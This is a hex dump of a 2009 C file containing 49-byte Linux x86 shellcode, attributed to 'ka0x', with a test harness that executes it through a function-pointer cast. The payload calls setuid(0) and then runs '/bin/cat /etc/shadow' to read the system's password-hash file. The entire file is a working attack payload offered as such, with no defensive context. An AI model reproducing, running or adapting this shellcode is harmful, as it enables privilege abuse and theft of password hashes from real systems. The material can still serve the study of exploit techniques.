00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 20 0d 0a 2f  2a 0d 0a 20 20 20 20 6c  |h>.. ../*..    l|
00000020  69 6e 75 78 2f 78 38 36  20 3b 20 73 65 74 75 69  |inux/x86 ; setui|
00000030  64 28 30 29 20 26 20 65  78 65 63 76 65 28 2f 62  |d(0) & execve(/b|
00000040  69 6e 2f 63 61 74 20 2f  65 74 63 2f 73 68 61 64  |in/cat /etc/shad|
00000050  6f 77 29 20 34 39 20 62  79 74 65 73 0d 0a 20 20  |ow) 49 bytes..  |
00000060  20 20 77 72 69 74 74 65  6e 20 62 79 20 6b 61 30  |  written by ka0|
00000070  78 20 2d 20 3c 6b 61 30  78 30 31 5b 61 6c 74 2b  |x - <ka0x01[alt+|
00000080  36 34 5d 67 6d 61 69 6c  2e 63 6f 6d 3e 0d 0a 20  |64]gmail.com>.. |
00000090  20 20 20 6c 75 6e 20 73  65 70 20 32 31 20 31 36  |   lun sep 21 16|
000000a0  3a 34 30 3a 31 36 20 43  45 53 54 20 32 30 30 39  |:40:16 CEST 2009|
000000b0  0d 0a 20 0d 0a 20 20 20  20 67 72 65 65 74 73 3a  |.. ..    greets:|
000000c0  20 61 6e 30 64 65 2c 20  50 69 6b 65 72 2c 20 78  | an0de, Piker, x|
000000d0  61 72 6e 75 7a 2c 20 4e  75 6c 6c 57 61 76 65 30  |arnuz, NullWave0|
000000e0  37 2c 20 50 65 70 65 6c  75 78 2c 20 4a 6f 73 53  |7, Pepelux, JosS|
000000f0  2c 20 73 63 68 33 6d 34  2c 20 54 72 61 6e 63 65  |, sch3m4, Trance|
00000100  6b 20 61 6e 64 20 6f 74  68 65 72 73 21 0d 0a 2a  |k and others!..*|
00000110  2f 0d 0a 20 0d 0a 69 6e  74 20 6d 61 69 6e 28 29  |/.. ..int main()|
00000120  0d 0a 7b 0d 0a 20 20 20  20 63 68 61 72 20 73 68  |..{..    char sh|
00000130  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0d 0a 20 20 20  |ellcode[] =..   |
00000140  20 20 20 20 20 20 20 20  20 22 5c 78 33 31 5c 78  |         "\x31\x|
00000150  64 62 22 20 20 20 20 20  20 2f 2f 20 78 6f 72 20  |db"      // xor |
00000160  65 62 78 2c 65 62 78 0d  0a 20 20 20 20 20 20 20  |ebx,ebx..       |
00000170  20 20 20 20 20 22 5c 78  36 61 5c 78 31 37 22 20  |     "\x6a\x17" |
00000180  20 20 20 20 20 2f 2f 20  70 75 73 68 20 62 79 74  |     // push byt|
00000190  65 20 31 37 68 20 20 20  0d 0a 20 20 20 20 20 20  |e 17h   ..      |
000001a0  20 20 20 20 20 20 22 5c  78 35 38 22 20 20 20 20  |      "\x58"    |
000001b0  20 20 20 20 20 20 2f 2f  20 70 6f 70 20 65 61 78  |      // pop eax|
000001c0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |..            "\|
000001d0  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 2f 2f  |xcd\x80"      //|
000001e0  20 69 6e 74 20 30 78 38  30 0d 0a 20 20 20 20 20  | int 0x80..     |
000001f0  20 20 20 20 20 20 20 22  5c 78 38 64 5c 78 34 33  |       "\x8d\x43|
00000200  5c 78 30 62 22 20 20 20  20 20 20 2f 2f 20 6c 65  |\x0b"      // le|
00000210  61 20 65 61 78 2c 5b 65  62 78 2b 30 78 62 5d 0d  |a eax,[ebx+0xb].|
00000220  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
00000230  39 39 22 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |99"          // |
00000240  63 64 71 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |cdq..           |
00000250  20 22 5c 78 35 32 22 20  20 20 20 20 20 20 20 20  | "\x52"         |
00000260  20 2f 2f 20 70 75 73 68  20 65 64 78 0d 0a 20 20  | // push edx..  |
00000270  20 20 20 20 20 20 20 20  20 20 22 5c 78 36 38 5c  |          "\x68\|
00000280  78 32 66 5c 78 36 33 5c  78 36 31 5c 78 37 34 22  |x2f\x63\x61\x74"|
00000290  20 20 2f 2f 20 70 75 73  68 20 64 77 6f 72 64 20  |  // push dword |
000002a0  30 78 37 34 36 31 36 33  32 66 0d 0a 20 20 20 20  |0x7461632f..    |
000002b0  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 32  |        "\x68\x2|
000002c0  66 5c 78 36 32 5c 78 36  39 5c 78 36 65 22 20 20  |f\x62\x69\x6e"  |
000002d0  2f 2f 20 70 75 73 68 20  64 77 6f 72 64 20 30 78  |// push dword 0x|
000002e0  36 65 36 39 36 32 32 66  0d 0a 20 20 20 20 20 20  |6e69622f..      |
000002f0  20 20 20 20 20 20 22 5c  78 38 39 5c 78 65 33 22  |      "\x89\xe3"|
00000300  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 65 62 78  |      // mov ebx|
00000310  2c 65 73 70 0d 0a 20 20  20 20 20 20 20 20 20 20  |,esp..          |
00000320  20 20 22 5c 78 35 32 22  20 20 20 20 20 20 20 20  |  "\x52"        |
00000330  20 20 2f 2f 20 70 75 73  68 20 65 64 78 0d 0a 20  |  // push edx.. |
00000340  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 36 38  |           "\x68|
00000350  5c 78 36 31 5c 78 36 34  5c 78 36 66 5c 78 37 37  |\x61\x64\x6f\x77|
00000360  22 20 20 2f 2f 20 70 75  73 68 20 64 77 6f 72 64  |"  // push dword|
00000370  20 30 78 37 37 36 66 36  34 36 31 0d 0a 20 20 20  | 0x776f6461..   |
00000380  20 20 20 20 20 20 20 20  20 22 5c 78 36 38 5c 78  |         "\x68\x|
00000390  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 22 20  |2f\x2f\x73\x68" |
000003a0  20 2f 2f 20 70 75 73 68  20 64 77 6f 72 64 20 30  | // push dword 0|
000003b0  78 36 38 37 33 32 66 32  66 0d 0a 20 20 20 20 20  |x68732f2f..     |
000003c0  20 20 20 20 20 20 20 22  5c 78 36 38 5c 78 32 66  |       "\x68\x2f|
000003d0  5c 78 36 35 5c 78 37 34  5c 78 36 33 22 20 20 2f  |\x65\x74\x63"  /|
000003e0  2f 20 70 75 73 68 20 64  77 6f 72 64 20 30 78 36  |/ push dword 0x6|
000003f0  33 37 34 36 35 32 66 0d  0a 20 20 20 20 20 20 20  |374652f..       |
00000400  20 20 20 20 20 22 5c 78  38 39 5c 78 65 31 22 20  |     "\x89\xe1" |
00000410  20 20 20 20 20 2f 2f 20  6d 6f 76 20 65 63 78 2c  |     // mov ecx,|
00000420  65 73 70 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |esp..           |
00000430  20 22 5c 78 35 32 22 20  20 20 20 20 20 20 20 20  | "\x52"         |
00000440  20 2f 2f 20 70 75 73 68  20 65 64 78 0d 0a 20 20  | // push edx..  |
00000450  20 20 20 20 20 20 20 20  20 20 22 5c 78 35 31 22  |          "\x51"|
00000460  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000470  68 20 65 63 78 0d 0a 20  20 20 20 20 20 20 20 20  |h ecx..         |
00000480  20 20 20 22 5c 78 35 33  22 20 20 20 20 20 20 20  |   "\x53"       |
00000490  20 20 20 2f 2f 20 70 75  73 68 20 65 62 78 0d 0a  |   // push ebx..|
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 38  |            "\x8|
000004b0  39 5c 78 65 31 22 20 20  20 20 20 20 2f 2f 20 6d  |9\xe1"      // m|
000004c0  6f 76 20 65 63 78 2c 65  73 70 0d 0a 20 20 20 20  |ov ecx,esp..    |
000004d0  20 20 20 20 20 20 20 20  22 5c 78 63 64 5c 78 38  |        "\xcd\x8|
000004e0  30 22 20 3b 20 20 20 20  20 20 20 20 2f 2f 20 69  |0" ;        // i|
000004f0  6e 74 20 38 30 68 0d 0a  20 0d 0a 20 20 20 20 70  |nt 80h.. ..    p|
00000500  72 69 6e 74 66 28 22 5b  2a 5d 20 53 68 65 6c 6c  |rintf("[*] Shell|
00000510  43 6f 64 65 20 73 69 7a  65 20 28 62 79 74 65 73  |Code size (bytes|
00000520  29 3a 20 25 64 5c 6e 5c  6e 22 2c 20 73 69 7a 65  |): %d\n\n", size|
00000530  6f 66 28 73 68 65 6c 6c  63 6f 64 65 29 2d 31 20  |of(shellcode)-1 |
00000540  29 3b 0d 0a 20 20 20 20  28 2a 28 76 6f 69 64 28  |);..    (*(void(|
00000550  2a 29 28 29 29 20 73 68  65 6c 6c 63 6f 64 65 29  |*)()) shellcode)|
00000560  28 29 3b 0d 0a 20 20 20  20 20 0d 0a 20 20 20 20  |();..     ..    |
00000570  72 65 74 75 72 6e 20 30  3b 0d 0a 7d              |return 0;..}|
0000057c
